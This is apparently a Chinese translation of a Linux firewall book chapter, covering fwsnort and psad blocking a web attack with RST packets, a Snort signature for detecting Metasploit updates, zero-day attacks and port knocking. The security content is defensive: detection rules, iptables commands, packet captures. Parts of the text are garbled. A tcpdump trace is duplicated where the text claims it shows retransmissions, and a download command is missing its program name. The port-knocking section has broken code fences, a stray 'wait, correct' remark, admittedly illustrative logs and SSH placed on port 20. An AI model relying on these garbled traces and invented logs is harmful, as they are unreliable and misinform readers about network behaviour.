现在，当我们再次对 Web 服务器发起攻击（在通过 `psad --Flush` 清除上一次攻击的 psad 拦截规则后），我们的 TCP 栈接收到一个强制会话关闭的 `RST` 包：

```
 [ext_scanner]$ lynx http://71.157.X.X/Setup.php
Alert! Unexpected network read error. Connection aborted.
Can't access 'http://71.157.X.X/Setup.php'
Alert! Unable to access document.
```

在 iptables 防火墙外部接口上捕获的数据包跟踪清晰地显示 `RST` 包（下文加粗处）被发送回了攻击者：

```
 [iptablesfw]# tcpdump -i eth0 -l -nn port 80
21:39:13.053057 IP 144.202.X.X.52092 > 71.157.X.X.80: S 1449291682:
1449291682(0)
win 5840 <mss 1460,sackOK,timestamp 3247303167 0,nop,wscale 2>
21:39:13.053177 IP 71.157.X.X.80 > 144.202.X.X.52092: S 1384965123:
1384965123(0)
ack 1449291683 win 5792 <mss 1460,sackOK,timestamp 2300769786 3247303167,nop,
wscale 2>
21:39:13.073190 IP 144.202.X.X.52092 > 71.157.X.X.80: . ack 1 win 1460
<nop,nop,
timestamp 3247303172 2300769786>
21:39:13.078382 IP 144.202.X.X.52092 > 71.157.X.X.80: P 1:229(228) ack
1 win 1460 <nop,nop,timestamp 3247303174 2300769786>
21:39:13.078442 IP 71.157.X.X.80 > 144.202.X.X.52092: R
1384965124:1384965124(0)
win 0
```

### 拦截入站 RST

在上面的攻击示例中，TCP 连接的客户端接收到了一个 `RST`，并被本地 TCP 栈所处理。但如果攻击者运行的操作系统包含一个防火墙（如 `iptables`），能够在本地 TCP 栈看到之前过滤掉入站的 `RST` 包，会话还会像什么都没发生一样继续吗？

答案是否定的。尽管会话保持开启（因为 `REJECT` 目标仅向触发 `REJECT` 匹配的 IP 地址发送 `RST` 包），该包同时被 `iptables` *丢弃*。因此，这种场景与第 199 页的 fwsnort 和 psad 类似，那里使用的是 `DROP` 目标而不是 `REJECT` 目标。由于在这种情况下攻击者运行的操作系统是 Linux，我们可以调查在使用 `lynx` 客户端发送攻击后过滤入站的 `RST` 会发生什么。首先，我们在 `ext_scanner` 系统上添加 `iptables` 规则来过滤所有入站的 `RST` 包，然后重新运行：

```
 [ext_scanner]# iptables -I INPUT 1 -p tcp --tcp-flags RST -s 71.157.X.X -j
DROP
[ext_scanner]$ lynx http://71.157.X.X
HTTP request sent; waiting for response
```

结果数据包跟踪显示攻击者的 TCP 栈重传了包含 `/Setup.php` 字符串的数据包，这反过来表明栈从未接收到远程 iptables 防火墙生成的 `RST` 包。因为每个重传的数据包都会匹配 `fwsnort` 设置的 `REJECT` 规则，因此每个包都会触发来自 `iptables` 的新的 `RST`。而且由于攻击者系统的 `RST` 过滤规则仍然有效，攻击者的 TCP 栈再次没有看到 `RST`。下文显示了 `RST` 包（注意，没有 `RST` 包包含 `ACK` 位）。

```
 [iptablesfw]# tcpdump -i eth0 -l -nn port 80
21:39:13.053057 IP 144.202.X.X.52092 > 71.157.X.X.80: S 1449291682:
1449291682(0)
win 5840 <mss 1460,sackOK,timestamp 3247303167 0,nop,wscale 2>
21:39:13.053177 IP 71.157.X.X.80 > 144.202.X.X.52092: S 1384965123:
1384965123(0)
ack 1449291683 win 5792 <mss 1460,sackOK,timestamp 2300769786 3247303167,nop,
wscale 2>
21:39:13.073190 IP 144.202.X.X.52092 > 71.157.X.X.80: . ack 1 win 1460
<nop,nop,
timestamp 3247303172 2300769786>
21:39:13.078382 IP 144.202.X.X.52092 > 71.157.X.X.80: P 1:229(228) ack
1 win 1460 <nop,nop,timestamp 3247303174 2300769786>
21:39:13.078442 IP 71.157.X.X.80 > 144.202.X.X.52092: R
1384965124:1384965124(0)
win 0
```

### NF_DROP 宏

查看源码证实了 `iptables` `REJECT` 目标会丢弃匹配的数据包。具体来说，如果你查看内核源码中的 `linux/net/ipv4/netfilter/ipt_REJECT.c` 文件，你将在 `reject()` 函数的三个地方看到以下返回语句（并且没有其他返回语句）：

```
 return NF_DROP;
```

因此，`NF_DROP` 宏是 `reject()` 函数唯一可能的返回值，它指示 `iptables` 在本地丢弃任何匹配的数据包。匹配的数据包被阻止继续向上栈传输或被转发到其预定目的地。因此，在我们的攻击示例中，即使攻击者过滤了 `RST`，Web 服务器仍然从未见过入站的 `/Setup.php` 攻击。

* * *

³ 回想第 3 章，这个来自 iptables 的 `RST` 包没有设置 `ACK` 位，因为触发规则匹配的恶意数据包是已建立 TCP 连接的一部分，因此其本身设置了 `ACK` 位，且 RFC 793 规定响应此类数据包生成的任何 `RST` 包都不会设置 `ACK` 位。只有当上一个收到的包没有设置 `ACK` 位时，才会发送 `RST/ACK`。





Metasploit 项目 ([Metasploit](http://www.metasploit.com)) 是当今最重要的开源安全项目之一。它的持续开发对计算机安全具有深远的影响，在安全研究人员的 Fyodor 前 100 大网络安全工具列表) 中，它一直被列为顶级安全工具之一。Metasploit 是一个用于自动化开发和使用针对软件漏洞攻击的插件化框架，围绕 Metasploit 建立的社区对漏洞研究和自动化水平做出了巨大贡献。（与许多安全技术一样，Metasploit 的漏洞利用能力可能会被试图入侵系统的人所滥用，但 Metasploit 对安全格局的整体影响是积极的——更多的软件供应商将更加关注安全。）

# Metasploit 更新功能

如果有人利用你的公司网络作为启动 Metasploit 攻击的跳板，他们几乎肯定违反了你们的本地安全策略（除非这是官方授权的活动，例如专业的渗透测试）。检测此类活动的一种良好方法是寻找与 Metasploit 更新过程相关的流量。

Metasploit 开发人员定期发布针对新漏洞的利用程序，且 Metasploit 为其漏洞数据库提供了在线功能，使用户可以利用这些新漏洞，而无需等待下一次 Metasploit 发布。从安全的角度来看，用户随意浏览 [`www.metasploit.com`](http://www.metasploit.com) 网站并不有趣。但当用户实际上在使用该软件时，Metasploit 更新过程就是此类活动的良好指标。本节的目标是展示在开发出 Snort 规则后，`fwsnort` 和 `psad` 如何协同工作停止 Metasploit 更新。

所有 Metasploit 更新默认都通过带有自签名 SSL 证书的 SSL 进行。图 11-1 显示了一个 Metasploit 客户端通过运行着 `fwsnort` 和 `psad` 的 `iptables` 防火墙启动更新。

![Metasploit update through fwsnort and psad](img/httpatomoreillycomsourcenostarchimages207439.png)

图 11-1. 通过 fwsnort 和 psad 更新 Metasploit

如如图所示，客户端使用了 Metasploit 更新功能，但在 Metasploit SSL 服务器返回更新之前，必须实例化一个有效的 SSL 会话。因此，在 SSL 握手期间，Metasploit 服务器会将其 SSL 证书返回给客户端。

Metasploit 更新过程取决于 Metasploit 框架的版本。从 3.0 版本开始，Metasploit 使用 Ruby 编写，并使用 Subversion 版本控制系统^([67]) 不仅更新漏洞数据库，还更新源代码文件。由于 Subversion 可以 SSL 与远程仓库通信，Metasploit 不需要将此功能构建到其代码中。相比之下，Metasploit 2.x 系列通过从命令行执行的 Perl 脚本 `msfupdate` 执行更新。

## Metasploit 3.0 更新

要下载并更新 Metasploit 3.0 框架，用户可以执行以下命令。（为了简洁，删除了部分输出，并且我们假设已安装了 Subversion 客户端命令 `svn`。）由于我们想查看 Metasploit 更新过程如何与更新服务器通信，我们在 `iptablesfw` 系统上使用 `tcpdump` 进行数据包捕获，然后切换到 `int_scanner` 系统进行更新。（`tcpdump` 的命令行参数 `-s 0` 确保记录每个包的完整长度。）

```
 [iptablesfw]# tcpdump -i eth1 -s 0 -l -nn port 443 -w metasploit_update.pcap
[int_scanner]$ http://framework-mirrors.metasploit.com/msf/downloader/framework-
3.0.tar.gz
[int_scanner]$ tar xfz framework-3.0.tar.gz
[int_scanner]$ cd framework-3.0
[int_scanner]$ svn update
❶ Error validating server certificate for 'https://metasploit.com:443':
 - 证书不是由受信任的机构颁发的。请使用指纹手动手动验证证书！
Certificate information:
 - Hostname: metasploit.com
 - Valid: from Tue, 31 Jul 2007 15:39:57 GMT until Wed, 30 Jul 2008 15:39:57 GMT
❷  - Issuer: Development, The Metasploit Project, San Antonio, Texas, US
 - Fingerprint: 05:aa:fd:bb:ea:cb:5d:bb:00:69:6b:d9:5e:35:cf:75:83:3e:fc:ff
(R)eject, accept (t)temporarily or accept (p)permanently? t
U    external/ruby-lorcon/extconf.rb
Updated to revision 4592
```

在上面的 ❶ 处，你看到 Metasploit 使用了自签名 SSL 证书，在 ❷ 处你看到该证书的发行者和指纹信息，我们通过按下 `t` 临时接受它。此时，我们的本地漏洞数据库和所有相关的源代码文件已与 Metasploit Subversion 仓库提供的最新版本同步，并且我们拥有包含了整个更新过程数据包捕获的 `metasploit_update.pcap` 文件。（你可以从 [`www.cipherdyne.org/linuxfirewalls`](http://www.cipherdyne.org/linuxfirewalls) 下载此文件。）

## Metasploit 2.6 更新

以下是你用于使用 `msfupdate` 脚本更新 Metasploit 2.6 框架的命令。由于此更新过程也通过 SSL 进行，我们不需要收集另一个数据包捕获——我们只需要查看 SSL 证书是如何在网络上传输的。在第 205 页 Metasploit 3.0 更新 中获取的数据包捕获就足够了。

```
 [int_scanner]$ wget http://www.metasploit.com/tools/framework-2.6.tar.gz
[int_scanner]$ tar xfz framework-2.6.tar.gz
[int_scanner]$ cd framework-2.6
[int_scanner]$ ./msfupdate -u

+ -- --=[ msfupdate v2.6 [revision 1.45]
[*] Calculating local file checksums. Please wait...
        Update: ./data/meterpreter/ext_server_sam.dll
        Update: ./data/msfpayload/template.exe
        Update: ./exploits/badblue_ext_overflow.pm
        Update: ./exploits/bomberclone_overflow_win32.pm
Continue? (yes or no) > yes
[*] Starting online update of 34 file(s)...
[0001/0034 - 0x012000 bytes] ./data/meterpreter/ext_server_sam.dll
[0002/0034 - 0x002e00 bytes] ./data/msfpayload/template.exe
[0003/0034 - 0x000c74 bytes] ./exploits/badblue_ext_overflow.pm
[0004/0034 - 0x000c72 bytes] ./exploits/bomberclone_overflow_win32.pm
[*] Regenerating local file database
```

## 签名开发

在上一节中，我们收集了 Metasploit 更新 SSL 会话的数据包捕获，这使我们能够看到 SSL 证书的样子。编写 Snort 规则以准确检测 Metasploit 更新的第一步是使用你喜欢的嗅探器或协议解码器分析此数据包捕获。我们的目标是编写一个 `fwsnort` 可以翻译成等效 `iptables` 规则的 Snort 规则。

由于 Metasploit 更新过程带有自签名 SSL 证书的 SSL，开发此类 Snort 规则的一种策略是让 Snort 在证书于客户端和服务器之间传输时查找它。由于证书名称在 SSL 会话中以明文传输，因此很容易使用 Wireshark^([68]) 或 `tcpdump` 等工具从数据包捕获中提取此名称。我们在下方使用了 `tcpdump`（部分输出已省略）：





```
 [iptablesfw]# tcpdump -r metasploit_update.pcap -s 0 -nn -X
22:52:30.178782 IP 216.75.15.231.443 > 192.168.10.200.49356: . 1:1449(1448)
ack 127 win 46 <nop,nop,timestamp 536123815 630321353>
     0x0000:  4500 05dc d24f 4000 2f06 c0ee d84b 0fe7  E....O@./....K..
     0x0010:  c0a8 0a03 01bb c0cc ee22 4bef 43a2 a027  ........."K.C..'
     0x0020:  8010 002e 82eb 0000 0101 080a 1ff4 99a7  ................
     0x0030:  2591 f0c9 1603 0100 4a02 0000 4603 0145  %.......J...F..E
     0x0040:  42c5 ce81 9f02 eb05 ed30 ca9b 0973 a4d7  B........0...s..
     0x0050:  4182 de5a 5d7b 4c0c 59eb f300 0000 0020  A..Z]{L.Y.......
     0x0060:  6e67 1dfa 6363 78fb c180 d6d4 05f4 640e  ng..ccx.......d.
     0x0070:  be4f 4eb6 3fcf 8af7 ad95 3fd4 e901 c81d  .ON.?.....?.....
     0x0080:  0039 0016 0301 0674 0b00 0670 0006 6d00  .9.....t...p..m.
     0x0090:  066a 3082 0666 3082 054e a003 0201 0202  .j0..f0..N......
     0x00a0:  0101 300d 0609 2a86 4886 f70d 0101 0405  ..0...*.H.......
     0x00b0:  0030 81a8 310b 3009 0603 5504 0613 0255  .0..1.0...U....U
     0x00c0:  5331 0e30 0c06 0355 0408 1305 5465 7861  S1.0...U....Texa
     0x00d0:  7331 1430 1206 0355 0407 130b 5361 6e20  s1.0...U....San.
     0x00e0:  416e 746f 6e69 6f31 1f30 1d06 0355 040a  Antonio1.0...U..
     0x00f0:  1316 5468 6520 4d65 7461 7370 6c6f 6974  ..The.Metasploit
     0x0100:  2050 726f 6a65 6374 3114 3012 0603 5504  .Project1.0...U.
     0x0110:  0b13 0b44 6576 656c 6f70 6d65 6e74 3116  ...Development1.
     0x0120:  3014 0603 5504 0313 0d4d 6574 6173 706c  0...U....Metaspl
     0x0130:  6f69 7420 4341 3124 3022 0609 2a86 4886  oit.CA1$0"..*.H.
     0x0140:  f70d 0109 0116 1563 6163 6572 7440 6d65  .......cacert@me
0x0150:  7461 7370 6c6f 6974 2e63 6f6d 301e 170d  tasploit.com0...
```

注意上述独特的字符串（上方已加粗），它将 Metasploit Web 服务器作为与 SSL 证书相关的电子邮件地址。我们将使用证书中的邮箱部分作为自定义 Snort 规则的 content 字段，该规则的 ID 为 `900001`，并将其放在名为 `metasploit.rules` 的文件中：

```
 [iptablesfw]# cat metasploit.rules
alert tcp $EXTERNAL_NET 443 -> $HOME_NET any (msg:"Metasploit exploit DB update";
flow:established; content:"cacert@metasploit.com"; classtype:misc-activity;
sid:900001; rev:1;)
```

 使用 fwsnort 和 psad 阻止 Metasploit 更新

配备了新的 Snort 规则后，我们可以使用 `fwsnort` 和 `psad` 来识别并停止由 `svn update` 或 `msfupdate` 命令启动的 SSL 会话。

 注意

当然，我们的规则不会阻止其他更新 Metasploit 的方法，例如通过 SSH 对已更新过数据库的外部机器使用 `rsync`。此外，除非先看到 SSL 会话，否则我们不会部署可能干扰基础 DNS 查询或对 [metasploit.com](http://metasploit.com) Web 请求的 `fwsnort` 或 `psad` 响应。

如前所述，让 `fwsnort` 停止 Metasploit 更新过程的第一步是将我们的新 Snort 规则转换为等效的 `iptables` 规则。为此，我们将 `metasploit.rules` 文件复制到 `/etc/fwsnort/snort_rules` 目录并运行 `fwsnort`。由于我们专注于阻止 Metasploit 更新，因此在 `fwsnort` 中使用了 `--ipt-reject` 命令行参数：

```
 [iptablesfw]# cp metasploit.rules /etc/fwsnort/snort_rules
 [iptablesfw]# fwsnort --ipt-reject
 [+] Parsing Snort rules...
 [+] Found sid:900001 in metasploit.rules
 [+] Logfile: /etc/fwsnort/snort.log
+] Script: /etc/fwsnort/snort.sh
```




由于我们的 `Snort` 规则检测到来自端口 `443` 的 Metasploit SSL 证书，`psad` 将流量源识别为连接的服务器端而非客户端。结果是被 `iptables` 规则拦截的是 `metasploit.com` 的 IP 地址 (`216.75.15.231`)，而不是内部网络上的客户端 IP 地址 (`192.168.10.200`)。`psad` 的后续版本将允许你定义想要拦截与 `fwsnort` 日志消息相关的源 IP 还是目的 IP。尽管如此，你仍然可以通过上述“检测到扫描”的 syslog 消息识别尝试更新 Metasploit 的客户端。

我们将用一封来自 `psad` 的关于尝试更新 Metasploit 具体的精彩邮件（完整版见下文）作为本章的结束：

```
 From: root <root@cipherdyne.org>
Subject: [psad-alert] DL4 src: metasploit.com dst: int_scanner
To: mbr@cipherdyne.org
Date:  Thu, 31  Jul  2008  17:42:14 -0400 (EDT)

Jul
         Danger level: [4] (out of 5)
❶     Scanned TCP ports: [38528: 1 packets]
            TCP flags: [ACK: 1 packets]
❷        iptables chain: FWSNORT_FORWARD_ESTAB (prefix "REJ SID900001 ESTAB"),
                               1 packets
         fwsnort rule: 1
               Source: 216.75.15.231
❸                   DNS: metasploit.com
          Destination: 192.168.10.200
                  DNS: [No reverse dns info available]
      Syslog hostname: iptables
   Overall scan start: Thu Jul 31 17:42:13 2007
   Total email alerts: 1
   Complete TCP range: [53003]
      Syslog hostname: iptablesfw
         Global stats: chain:   interface:   TCP:   UDP:   ICMP:
                       INPUT    eth0         1      0      0
❹
 [+] TCP scan signatures:
   "Metasploit exploit DB update"
       flags:     ACK
       content:   "cacert@metasploit.com"
       sid:       900001
       chain:     FWSNORT_FORWARD_ESTAB
       packets:   1
       classtype: misc-activity
❺
 [+] whois Information:
OrgName:    California Regional Intranet, Inc.
OrgID:      CALI
Address:    8929A COMPLEX DRIVE
City:       SAN DIEGO
StateProv:  CA
PostalCode: 92123
Country:    US
ReferralServer: rwhois://rwhois.cari.net:4321
NetRange:   216.75.0.0 - 216.75.63.255
CIDR:       216.75.0.0/18
NetName:    CARI-4
NetHandle:  NET-216-75-0-0-1
Parent:     NET-216-0-0-0-0
NetType:    Direct Allocation
NameServer: NS1.ASPADMIN.COM
NameServer: NS2.ASPADMIN.COM
Comment:
RegDate:    2005-09-07
Updated:    2006-02-01
RTechHandle: IC63-ARIN
RTechName:   System Administration
RTechPhone:  +1-858-974-5080
RTechEmail:  sysadmin@cari.net
OrgTechHandle: SYSAD5-ARIN
OrgTechName:   sysadmin
OrgTechPhone:  +1-858-974-5080
OrgTechEmail:  sysadmin@cari.net
## ARIN WHOIS database, last updated 2006-10-28 19:10
# Enter ? ? additional hints on searching ARIN's WHOIS database

Found a referral to rwhois.cari.net:4321
%rwhois V-1.5:003fff:00 wi1.cari.net (by Network Solutions, Inc. V-1.5.9.5)
network:Auth-Area:216.75.0.0/18
network:Class-Name:network
network:ID:CARI-NET-37
network:Network-Name:CARI-NET-37
network:IP-Network:216.75.15.0/24
network:Org-Name:Complex Drive Business Internet
network:Street-Address:CA
network:City:San Diego
network:State:CA
network:Postal-Code:92123
network:Country-Code:USA
network:Tech-Contact:sysadmin@cari.net
network:Created:20060113
network:Updated-By:sysadmin@cari.net
%referral rwhois://root.rwhois.net:4321/auth-area=.
%ok
```

在上面的代码列表中，❶ 捕获了目的 TCP 端口号 `38528`，这是内部客户端系统选择的源端口。行 ❷ 显示了由 `fwsnort` `iptables` 规则指定的日志前缀，❸ 是与 `216.75.15.231` IP 地址关联的反向 DNS 主机名，❹ 标记了匹配包的细节，包括 `cacert@metasploit.com` 应用层字符串。最后，❺ 显示了与 `216.75.15.231` IP 地址相关的完整 whois 信息。

*** *

⁴ `Subversion`（参见 `http://subversion.tigris.org`）是跟踪源代码（甚至是二进制文件）变化的极佳机制。`http://www.cipherdyne.org` 的所有项目都在 `Subversion` 仓库中跟踪，甚至用于编写本书的文件在编写过程中也通过 `Subversion` 跟踪。

⁵ 使用 `Wireshark` 中的 `Follow TCP Stream` 功能查看应用层数据变得异常简单。

# 结语

凭借来自 `Snort` 社区提供的指引有效检测方向的签名，`fwsnort` 和 `psad` 项目可以将你的 `iptables` 防火墙转换为一个能够检测并响应应用层攻击的系统。本质上，这把 `iptables` 变成了一个基础的入侵防御系统，能够阻止大量攻击与本地系统中绑定 socket 的进程交互，或与通过系统转发流量的远程客户端或服务器交互。在第 12 章和第 13 章中，我们将看到，通过默认丢弃（default-drop）数据过滤器和单包授权（Single Packet Authorization），阻止针对服务器的攻击可以变得更加健壮。

# 第 12 章 端口敲门（PORT KNOCKING）VS 单包授权

到本书为止，我一直致力于讨论使用各种 `iptables` 功能结合 `psad` 和 `fwsnort` 来检测并阻止基于网络的攻击。本章代表了对传统网络访问和安全模型的重大偏离，传统模型中，数据过滤器被配置为允许访问网络服务，而应用安全则留给应用程序本身，并辅以基于签名的入侵检测系统的（有限）帮助。通过对 `iptables` 采用默认丢弃策略，并同时允许能够通过被动收集的信息向 `iptables` 证明身份的客户端访问，我们可以为任意服务添加额外的安全层。

## 缩小攻击面

本书是关于使用 `Netfilter` 和 `iptables` 中的功能来检测和响应基于网络的攻击的，因此初看起来，本章和下一章（涵盖 `fwknop` 的 SPA 实现）似乎并不合群。然而，任何被默认丢弃数据过滤器保护的服务，除非重新配置数据过滤器以允许访问，否则对任意潜在客户端来说是根本不可访问的。这意味着只有经过授权的会话才能存在；反之，这也意味着此类服务的攻击率和误报率都会降低。这对于基于 TCP 的服务尤其如此，因为现在的大多数入侵检测系统维护 TCP 会话状态，以过滤掉在没有建立 TCP 会话的情况下在网络上伪造的虚假攻击。

此类 IDS 监控的伪造攻击不会产生误报，而通过已建立的 TCP 会话投递真实攻击将失败，因为无法建立会话。

## 零日攻击问题




过去几年，在软件安全方面付出了巨大努力——特别是像 `OpenBSD` 和 `OpenSSH` 这样的开源项目——新发现的漏洞数量似乎将会下降。然而，新漏洞正以不断加快的速度在各种软件中被发现，且看不到任何缓解的迹象。

### Note

Bugtraq、`Full-disclosure` 和 `Vuln-dev` 邮件列表非常活跃，并就某些最新利用程序和攻击技术提供了极佳的技术信息和讨论。许多公司（如 iDefense——参见 [`www.idefense.com`](http://www.idefense.com)）应运而生，其业务模式基于漏洞跟踪，为用户提供作为漏洞早期预警系统的服务。iDefense 甚至会为新漏洞漏洞研究人员付费，以换取优先发布的权利。

商业世界创建的大多数软件是为了客户开发的，目的是利润最大化，而非安全性。然而，随着高知名度安全问题的出现，如钓鱼、间谍软件、身份盗窃，特别是针对微软系统的破坏性虫（如 `Code Red` 和 `SQL Slammer` 蠕虫），公司开始更加重视安全。

诸如大型金融机构个人数据被盗等事件，也从大范围内提高了立法者对计算机和物理安全问题的关注。加州已经通过了一项法律，要求如果敏感信息被第三方非法获取，公司必须通知消费者（更多信息请参见 [`www.privacyrights.org/ar/itlawsca.htm`](http://www.privacyrights.org/ar/itlawsca.htm)）。

### Note

我将避免对关于微软操作系统和应用程序在本质上是否比其他操作系统和软件更不安全的近乎宗教的争论发表评论。无论如何，有一点是明确的：微软软件的普及以及其易受攻击的特性，共同导致了一个存在严重安全缺陷的全球基础设施。这为恶意软件提供了一个目标丰富的环境。

但是，计算机和软件到底有什么特性让它们在面对坚决的攻击者时显得如此脆弱？为什么安全漏洞如此常见？尽管这种技术在几十年前就已演示，为什么缓冲区溢出漏洞仍然泛滥？我们难道应该在很久以前就消灭这类 bug 吗？

与其对这些问题给出冗长的答案并带我们进入栈加固和内核模式保护等技术领域，我将做几点观察。

首先，软件总是依赖于实现，而且没有机制可以严格地验证某段软件是安全的。任何实现中的 bug 都可能导致一个理论上完美的软件设计面临安全问题。

其次，考虑 `OpenSSH` 项目（参见 [`www.openssh.org`](http://www.openssh.org)）。OpenSSH 由世界上最敏锐、最有安全意识的开发者编写，然而即使是 OpenSSH 也也被知道存在漏洞。这告诉我们，编写无 bug 的软件是 `really hard`，即使是最好的安全开发者也会犯错。

## 零日攻击发现

当有人在软件中发现了一个之前未被发现的安全漏洞并为其编写利用程序时，就产生了`零日攻击`。在一段时间内，这个人是世界上唯一知道该漏洞的人，他或她有一个选择：放弃使用利用程序并通知软件供应商以便其修复，或者为了利用程序获取个人利益且不通知任何人。后一种选择显然对软件用户构成了最大的威胁，黑帽和白帽黑客越来越多地发现零日利用程序。

## 对基于特征的入侵检测的影响

对于基于特征的入侵检测系统供应商来说，有一个有趣的问题：如何编写特征来检测针对零日漏洞的攻击？答案是，尽管某些营销部门可能是所说的，此类利用程序通常无法被检测到，因为只有发现利用程序的某个人知道漏洞的存在。要为一个甚至无法描述的攻击编写特征是极其困难的。

这并不是说无法做任何有用的事情；`Snort` 规则集中的几个特征被用于通用地检测攻击者在获得提权后，以可疑方式使用系统的尝试。这有时允许 `Snort` 检测到零日攻击的`effects`（即，当攻击者在获得访问权限后实际上尝试使用受侵害的系统时），而不一定需要检测攻击本身。例如，`shellcode.rules` 文件中的规则寻找许多公开可用利用程序之间共享的 shell 代码的共同点。攻击者可能只是将这些现成的 shell 代码片段之一（可以执行创建反向 shell 等操作）与新的攻击结合使用。代码复用在计算机地下世界的用处与它在软件开发的其他领域一样大。其他通用地检测可疑活动的的例子是 `Snort` 规则 ID `1341` 和 `1342`，它们会查找通过 HTTP 会话执行 `gcc` 编译器的尝试。如果 `Snort` 为这些规则之一生成告报，无论 Web 服务器是否已被零日攻击攻破，并不重要；警报标志着由于目标系统被以可疑的方式使用，已检测到成功利用的潜在影响。

零日漏洞问题已帮助催生了一类新的安全供应商，他们开发网络异常检测系统，这些产品旨在检测计算机网络内部的异常行为。这些目标是为了检测攻击者在成功攻破后使用网络内系统的方式。不过，需要提醒的是：截至本文写作时，我还没有看到有供应商以足够实用的方式来定义什么是`anomaly`。

问题在于，网络表现出如此惊人的异质性，以以区分正常行为和非正常行为。然而，这一领域在网络和单机方面都有大量的研究，并写了一些出色的论文。




例如，Steven A. Hofmeyr 的《UNIX 进程的自我感知》一文发表于 1996 年的 IEEE 会议集，该文研究了 `Sendmail` 和 `lpr` 在正常情况下与受到攻击时系统调用序列中的统计离群值。你可以在 [http://www.cs.unm.edu/∼immsec/publications/ieee-sp-96-unix.pdf#search=%22a%20sense%20of%20self%20for%20processes%22] 下载论文。

# 端口敲门 (Port Knocking)

2003 年，Martin Krzywinski 在 *SysAdmin* 杂志的一篇文章中向安全社区引入了一个名为 `port knocking`（端口敲门）的绝妙概念。`port knocking` 是跨关闭端口的身份验证数据通信，使得服务（如 `SSHD`）可以保护在配置为“默认丢弃（default-drop）”策略的数据包过滤器之后。任何想要通过默认丢弃数据包过滤器连接到受保护服务的潜在客户端，必须首先证明自己拥有有效的端口敲门序列。如果客户端生成了正确的敲门序列（例如，通过按顺序连接到序列中的每个组成端口），则数据包过滤器将临时重新配置，允许发送该序列的 IP 地址在短时间内连接到受保护的服务。

通常，端口敲门系统要么监控防火墙日志，要么使用原始数据包捕获机制（如 `libpcap`）来从端口敲门客户端收集敲门序列。我们稍后会看到 `iptables` 日志消息非常适合提供端口敲门序列数据。我们还将看到，虽然端口敲门是一项具有引人注目的创新的技术（即保护在默认丢弃数据包过滤器后的服务），但一种名为 `SPA` 的相关技术提供了与端口敲门相同的益处，同时消除了它的许多局限性。但在之前，我们需要一些关于端口敲门的背景知识。

端口敲门迅速取得了成功，在安全领域中出现了近 30 种已知的端口敲门方案实现，每种实现都对端口敲门概念有略有不同的改进。例如，`cd00r` 和 `portkey` 使用 `TCP SYN` 包来通信端口敲门序列，而 `Tumbler` 则使用数据包负载来发送哈希身份验证数据。（更多端口敲门方案的示例，请参见 [`www.portknocking.org.`](http://www.portknocking.org.)）我们稍后会看到，没有任何禁止使用数据包负载（而非仅数据包头）来发送身份验证数据——在这些实现中仍然可以实现在默认丢弃数据包过滤器后隐藏服务。

端口敲门序列可以是共享的非加密的端口集，也可以是使用对称密码（如 `Rijndael`）加密的端口集（这些方案的细节可见第 218 页的“共享端口敲门序列”和第 221 页的“加密端口敲门序列”）。

图 12-1 描述了一个网络图，其中使用端口敲门客户端针对一个运行着 `iptables` 防火墙和端口敲门服务器的 Linux 系统生成端口敲门序列。由于端口敲门从不需要双向通信（例如建立 `TCP` 连接所需的三次握手），因此端口敲门序列可以从虚假的 IP 地址进行伪装。这使得端口敲门序列可以来自任意 IP 地址，但敲门服务器接受连接到受保护服务的实际源 IP 地址被编码在序列本身。例如，你可以伪造一个序列，使其看起来源自源 IP 地址 `22.1.1.1` 并发送到运行在 IP 地址 `33.2.2.2` 上的敲门服务器。然而，你发起连接的真实源 IP 地址是是 `207.44.10.34`。通过在序列中编码 `207.44.10.34` 地址，敲门服务器将授予你的真实 IP 地址而非伪造的源 IP 地址 `22.1.1.1`。将真实源 IP 地址包含在端口敲门序列中仅在序列加密时才有意义，因为恶意的第三方无法拦截伪造的序列并轻易判断真实连接来自哪里。虽然图 12-1 中没有明确说明，但理解是客户端系统在 `iptables` 连接之前生成了端口敲门序列。

## 阻止 Nmap 和目标识别

端口敲门序列由端口敲门服务器监控，该服务器是“被动的”——例如，通过监控防火墙或使用如 `libpcap` 等数据包捕获工具。使用 `libpcap` 的结果对任何人都是不可见的。对于 `Nmap` 来说，攻击者是否拥有 `default-drop` 过滤器没有任何区别。

## 共享端口敲门序列

`port-knocking` 序列是一个约定的共享非加密端口集。当在网络上看到 `port-knocking` 序列时，`default-drop` 过滤器将被重新配置以允许访问端口 20 的 `SSHD`。以下数字在 `/var/log/messages` 文件中以粗体显示：

``` fetch[root@iptables]# tail -f /var/log/messages
Oct 30 21:39:38 kernel: [IN=eth0 OUT= MAC=00:xx:xx:xx:xx:xx SRC=192.168.1.1 DST=192.168.1.100 PROTO=TCP SPT=47344 DPT=5005 TCP [SYN] seq=12345 ack=0 window=64240 [flags=SYN]
``` 
Oct 30 21:39:41 kernel: [IN=eth0 OUT= MAC=00:xx:xx:xx:xx:xx SRC=192.168.1.1 DST=192.168.1.100 PROTO=TCP SPT=49371 DPT=5008 TCP [SYN] seq=67890 ack=0 window=64240 [flags=SYN]
```（等待，修正）
Oct 30 21:39:48 kernel: [IN=eth0 OUT= MAC=00:xx:xx:xx:xx:xx SRC=192.168.1.1 DST=192.168.1.100 PROTO=TCP SPT=59255 DPT=1002 TCP [SYN] seq=11223 ack=0 window=64240 [flags=SYN]
``` 
Oct 30 21:39:54 kernel: [IN=eth0 OUT= MAC=00:xx:xx:xx:xx:xx SRC=192.168.1.1 DST=192.168.1.100 PROTO=TCP SPT=49371 DPT=1050 TCP [SYN] seq=44556 ack=0 window=64240 [flags=SYN]
```

（注：上面的日志条目是文中描述序列的说明性表示）。




端口敲击序列（Port-knocking sequences）还可以包含 `TCP` 以外的其他互联网协议；`UDP`、`ICMP` 甚至这三种协议同时组成一个序列。这样的序列可能像 `TCP/10001`、`UDP/2300`、`ICMP Echo Request`、`TCP/6005`、`UDP/3000`。

### 注意

在端口敲击序列中包含 `ICMP` 数据包是对端口敲击定义的轻微偏离，因为 `ICMP` 并没有“端口”的概念。然而，这并不是严重的违规，因为端口敲击本质上是在数据包头部中编码信息；并没有任何规定禁止在序列中使用 `ICMP`。

事实上，`TCP` 或 `UDP` 头部中端口字段以外的字段也可以用于在端口敲击序列中编码额外信息。例如，`UDP` 头部中 16 位的校验和字段可以由端口敲击客户端手动设置为一个预定值，并可以开发一个端口敲击服务器，只有当校验和与该值匹配时才接受该 `UDP` 数据包作为序列的一部分。列表 12-1 显示了一个 Perl 代码段，允许用户针对任意 `UDP` 端口将 `UDP` 头部中的校验和字段构造为提供的十六进制值。

### 注意

